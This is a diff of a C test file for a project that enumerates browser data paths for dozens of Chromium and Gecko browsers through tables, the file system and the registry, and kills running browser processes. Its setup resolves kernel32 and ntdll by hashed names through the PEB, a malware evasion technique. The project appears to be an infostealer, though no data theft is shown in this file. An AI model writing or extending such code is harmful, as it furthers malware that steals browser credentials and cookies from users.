@@ -1,181 +1,244 @@
 /*
  * test_chromium.c — Browser path enumeration tests
  *
- * Tests get_chromium_browsers / get_gecko_browsers for:
- *   - Correct count (58 chromium, 10 gecko)
- *   - Non-NULL returns
- *   - Opera browsers use roaming
- *   - Known browser names present
+ * Uses ZIALFI_TEST_MODE to mock kernel32/ntdll module lookups,
+ * enabling full FS/registry/kill code path coverage.
  */
-
 #include <assert.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include "browser_paths.h"
+#include "hash.h"
+#include "peb.h"
+#include "config.h"
 
-static void test_chromium_count(void) {
-    size_t count = 0;
-    const BrowserPath *browsers = get_chromium_browsers(&count);
-    assert(browsers != NULL);
-    assert(count == 58);
 
-    printf("  PASS: test_chromium_count\n");
+static void setup_module_mocks(void) {
+    uint32_t h_lower = mirage_encrypted_hash_module("kernel32.dll");
+    uint32_t h_upper = mirage_encrypted_hash_module("KERNEL32.DLL");
+    void *k32 = mirage_get_module_by_hash(h_lower);
+    if (!k32) k32 = mirage_get_module_by_hash(h_upper);
+    if (k32) {
+        mirage_peb_mock_module(h_lower, k32);
+        mirage_peb_mock_module(h_upper, k32);
+    }
+    uint32_t h_nt_lower = mirage_encrypted_hash_module("ntdll.dll");
+    uint32_t h_nt_upper = mirage_encrypted_hash_module("NTDLL.DLL");
+    void *ntdll = mirage_get_module_by_hash(h_nt_lower);
+    if (!ntdll) ntdll = mirage_get_module_by_hash(h_nt_upper);
+    if (ntdll) {
+        mirage_peb_mock_module(h_nt_lower, ntdll);
+        mirage_peb_mock_module(h_nt_upper, ntdll);
+    }
+    printf("  MOCK: k32=%p ntdll=%p\n", k32, ntdll);
 }
 
-static void test_chromium_first_browser_is_chrome(void) {
+static void test_chromium_table(void) {
     size_t count = 0;
-    const BrowserPath *browsers = get_chromium_browsers(&count);
-    assert(browsers != NULL);
-    assert(strcmp(browsers[0].name, "Chrome") == 0);
-    assert(strstr(browsers[0].path_suffix, "Chrome") != NULL);
-
-    printf("  PASS: test_chromium_first_browser_is_chrome\n");
-}
-
-static void test_chromium_edge_present(void) {
-    size_t count = 0;
-    const BrowserPath *browsers = get_chromium_browsers(&count);
-    assert(browsers != NULL);
-
-    int found = 0;
+    const BrowserPath *b = get_chromium_browsers(&count);
+    assert(b != NULL);
+    assert(count >= 50);
     for (size_t i = 0; i < count; i++) {
-        if (strstr(browsers[i].name, "Edge")) {
-            found = 1;
-            assert(strstr(browsers[i].path_suffix, "Edge") != NULL);
-            break;
+        assert(b[i].name != NULL);
+        assert(strlen(b[i].name) > 0);
+        assert(b[i].path_suffix != NULL);
+    }
+    printf("  PASS: chromium table (%zu entries)\n", count);
+}
+
+static void test_gecko_table(void) {
+    size_t count = 0;
+    const BrowserPath *b = get_gecko_browsers(&count);
+    assert(b != NULL);
+    assert(count >= 5);
+    for (size_t i = 0; i < count; i++) {
+        assert(b[i].name != NULL);
+        assert(strlen(b[i].name) > 0);
+    }
+    printf("  PASS: gecko table (%zu entries)\n", count);
+}
+
+static void test_chromium_unique_names(void) {
+    size_t count = 0;
+    const BrowserPath *b = get_chromium_browsers(&count);
+    for (size_t i = 0; i < count; i++)
+        for (size_t j = i + 1; j < count; j++)
+            assert(strcmp(b[i].name, b[j].name) != 0);
+    printf("  PASS: chromium names unique\n");
+}
+
+static void test_gecko_unique_names(void) {
+    size_t count = 0;
+    const BrowserPath *b = get_gecko_browsers(&count);
+    for (size_t i = 0; i < count; i++)
+        for (size_t j = i + 1; j < count; j++)
+            assert(strcmp(b[i].name, b[j].name) != 0);
+    printf("  PASS: gecko names unique\n");
+}
+
+static void test_fs_discover_chromium(void) {
+    BrowserPath out[64];
+    size_t count = 0;
+    int rc = discover_chromium_browsers_fs(out, 64, &count);
+    if (rc == 0 && count > 0) {
+        for (size_t i = 0; i < count; i++) {
+            assert(out[i].name != NULL);
+            assert(strlen(out[i].name) > 0);
+            assert(out[i].path_suffix != NULL);
+        }
+        printf("  PASS: FS chromium found %zu\n", count);
+    } else {
+        printf("  SKIP: FS chromium (rc=%d, count=%zu)\n", rc, count);
+    }
+}
+
+static void test_fs_discover_gecko(void) {
+    BrowserPath out[32];
+    size_t count = 0;
+    int rc = discover_gecko_browsers_fs(out, 32, &count);
+    if (rc == 0 && count > 0) {
+        for (size_t i = 0; i < count; i++) {
+            assert(out[i].name != NULL);
+            assert(out[i].path_suffix != NULL);
+            assert(out[i].use_roaming == 1);
+        }
+        printf("  PASS: FS gecko found %zu\n", count);
+    } else {
+        printf("  SKIP: FS gecko (rc=%d)\n", rc);
+    }
+}
+
+static void test_registry_discover(void) {
+    BrowserPath out[64];
+    size_t count = 0;
+    int rc = discover_chromium_browsers_registry(out, 64, &count);
+    if (rc == 0 && count > 0) {
+        for (size_t i = 0; i < count; i++) {
+            assert(out[i].name != NULL);
+            assert(strlen(out[i].name) > 0);
+            assert(out[i].path_suffix != NULL);
+        }
+        printf("  PASS: Registry chromium found %zu\n", count);
+    } else {
+        printf("  SKIP: Registry chromium (rc=%d, count=%zu)\n", rc, count);
+    }
+}
+
+static void test_chromium_merged(void) {
+    size_t count1 = 0;
+    const BrowserPath *b1 = get_chromium_browsers(&count1);
+    assert(b1 != NULL);
+    size_t count2 = 0;
+    const BrowserPath *b2 = get_chromium_browsers(&count2);
+    assert(b2 == b1);
+    assert(count2 == count1);
+    printf("  PASS: chromium merged (%zu, cache hit)\n", count1);
+}
+
+static void test_gecko_merged(void) {
+    size_t count1 = 0;
+    const BrowserPath *b1 = get_gecko_browsers(&count1);
+    assert(b1 != NULL);
+    size_t count2 = 0;
+    const BrowserPath *b2 = get_gecko_browsers(&count2);
+    assert(b2 == b1);
+    assert(count2 == count1);
+    printf("  PASS: gecko merged (%zu, cache hit)\n", count1);
+}
+
+static void test_kill_null(void) {
+    kill_browser_processes(NULL);
+    printf("  PASS: kill(NULL) no crash\n");
+}
+
+static void test_kill_nonexistent(void) {
+    int rc = kill_browser_processes("nonexistent_xyz_12345");
+    assert(rc <= 0);
+    printf("  PASS: kill nonexistent = %d\n", rc);
+}
+
+static void test_fs_discover_zero_max(void) {
+    BrowserPath out[1];
+    size_t count = 99;
+    int rc = discover_chromium_browsers_fs(out, 0, &count);
+    assert(rc == -1);
+    printf("  PASS: FS zero max = -1\n");
+}
+
+static void test_fs_discover_null(void) {
+    size_t count = 0;
+    int rc = discover_chromium_browsers_fs(NULL, 64, &count);
+    assert(rc == -1);
+    printf("  PASS: FS NULL = -1\n");
+}
+
+static void test_chromium_roaming(void) {
+    size_t count = 0;
+    const BrowserPath *b = get_chromium_browsers(&count);
+    int n = 0;
+    for (size_t i = 0; i < count; i++)
+        if (b[i].use_roaming) n++;
+    assert(n >= 2);
+    printf("  PASS: roaming=%d\n", n);
+}
+
+static void test_chromium_process_names(void) {
+    size_t count = 0;
+    const BrowserPath *b = get_chromium_browsers(&count);
+    int n = 0;
+    for (size_t i = 0; i < count; i++) {
+        if (b[i].process_name && b[i].process_name[0]) {
+            n++;
         }
     }
-    assert(found);
-
-    printf("  PASS: test_chromium_edge_present\n");
+    assert(n > 0);
+    printf("  PASS: proc_names=%d/%zu\n", n, count);
 }
 
-static void test_chromium_brave_present(void) {
+static void test_gecko_null_args(void) {
+    BrowserPath out[1];
     size_t count = 0;
-    const BrowserPath *browsers = get_chromium_browsers(&count);
+    assert(discover_gecko_browsers_fs(NULL, 10, &count) == -1);
+    assert(discover_gecko_browsers_fs(out, 0, &count) == -1);
+    count = 99;
+    assert(discover_gecko_browsers_fs(out, 0, &count) == -1);
+    printf("  PASS: gecko NULL/zero args\n");
+}
 
-    int found = 0;
+static void test_gecko_process_names(void) {
+    size_t count = 0;
+    const BrowserPath *b = get_gecko_browsers(&count);
+    int n = 0;
     for (size_t i = 0; i < count; i++) {
-        if (strstr(browsers[i].name, "Brave")) {
-            found = 1;
-            assert(strstr(browsers[i].path_suffix, "Brave") != NULL);
-            break;
+        if (b[i].process_name && b[i].process_name[0]) {
+            n++;
         }
     }
-    assert(found);
-
-    printf("  PASS: test_chromium_brave_present\n");
-}
-
-static void test_opera_uses_roaming(void) {
-    size_t count = 0;
-    const BrowserPath *browsers = get_chromium_browsers(&count);
-    assert(browsers != NULL);
-
-    /* Opera (index 5) and Opera GX (index 6) use roaming */
-    int found_opera = 0;
-    int found_opera_gx = 0;
-    for (size_t i = 0; i < count; i++) {
-        if (strcmp(browsers[i].name, "Opera") == 0) {
-            assert(browsers[i].use_roaming == 1);
-            found_opera = 1;
-        }
-        if (strcmp(browsers[i].name, "Opera GX") == 0) {
-            assert(browsers[i].use_roaming == 1);
-            found_opera_gx = 1;
-        }
-    }
-    assert(found_opera);
-    assert(found_opera_gx);
-
-    printf("  PASS: test_opera_uses_roaming\n");
-}
-
-static void test_non_opera_uses_local(void) {
-    size_t count = 0;
-    const BrowserPath *browsers = get_chromium_browsers(&count);
-
-    /* Chrome, Edge, Brave should use LOCALAPPDATA (use_roaming == 0) */
-    for (size_t i = 0; i < count; i++) {
-        if (strcmp(browsers[i].name, "Chrome") == 0 ||
-            strcmp(browsers[i].name, "Edge") == 0 ||
-            strcmp(browsers[i].name, "Brave") == 0) {
-            assert(browsers[i].use_roaming == 0);
-        }
-    }
-
-    printf("  PASS: test_non_opera_uses_local\n");
-}
-
-static void test_gecko_count(void) {
-    size_t count = 0;
-    const BrowserPath *browsers = get_gecko_browsers(&count);
-    assert(browsers != NULL);
-    assert(count == 10);
-
-    printf("  PASS: test_gecko_count\n");
-}
-
-static void test_gecko_firefox_present(void) {
-    size_t count = 0;
-    const BrowserPath *browsers = get_gecko_browsers(&count);
-
-    int found = 0;
-    for (size_t i = 0; i < count; i++) {
-        if (strcmp(browsers[i].name, "Firefox") == 0) {
-            found = 1;
-            assert(browsers[i].use_roaming == 1);
-            assert(strstr(browsers[i].path_suffix, "Firefox") != NULL);
-            break;
-        }
-    }
-    assert(found);
-
-    printf("  PASS: test_gecko_firefox_present\n");
-}
-
-static void test_gecko_all_use_roaming(void) {
-    size_t count = 0;
-    const BrowserPath *browsers = get_gecko_browsers(&count);
-
-    for (size_t i = 0; i < count; i++) {
-        assert(browsers[i].use_roaming == 1);
-    }
-
-    printf("  PASS: test_gecko_all_use_roaming\n");
-}
-
-static void test_chromium_names_unique(void) {
-    /* Note: the browser list has some intentional duplicates (7Star, Liebao, etc.)
-     * This test verifies path_suffix uniqueness for each browser name */
-    size_t count = 0;
-    const BrowserPath *browsers = get_chromium_browsers(&count);
-
-    for (size_t i = 0; i < count; i++) {
-        assert(browsers[i].name != NULL);
-        assert(browsers[i].path_suffix != NULL);
-        assert(strlen(browsers[i].name) > 0);
-        assert(strlen(browsers[i].path_suffix) > 0);
-    }
-
-    printf("  PASS: test_chromium_names_unique\n");
+    assert(n > 0);
+    printf("  PASS: gecko proc=%d/%zu\n", n, count);
 }
 
 int main(void) {
-    printf("=== test_chromium: browser path enumeration ===\n");
-
-    test_chromium_count();
-    test_chromium_first_browser_is_chrome();
-    test_chromium_edge_present();
-    test_chromium_brave_present();
-    test_opera_uses_roaming();
-    test_non_opera_uses_local();
-    test_gecko_count();
-    test_gecko_firefox_present();
-    test_gecko_all_use_roaming();
-    test_chromium_names_unique();
-
+    printf("=== test_chromium ===\n");
+    setup_module_mocks();
+    test_chromium_table();
+    test_gecko_table();
+    test_chromium_unique_names();
+    test_gecko_unique_names();
+    test_fs_discover_chromium();
+    test_fs_discover_gecko();
+    test_registry_discover();
+    test_chromium_merged();
+    test_gecko_merged();
+    test_kill_null();
+    test_kill_nonexistent();
+    test_fs_discover_zero_max();
+    test_fs_discover_null();
+    test_chromium_roaming();
+    test_chromium_process_names();
+    test_gecko_null_args();
+    test_gecko_process_names();
     printf("=== test_chromium: ALL PASSED ===\n");
     return 0;
 }
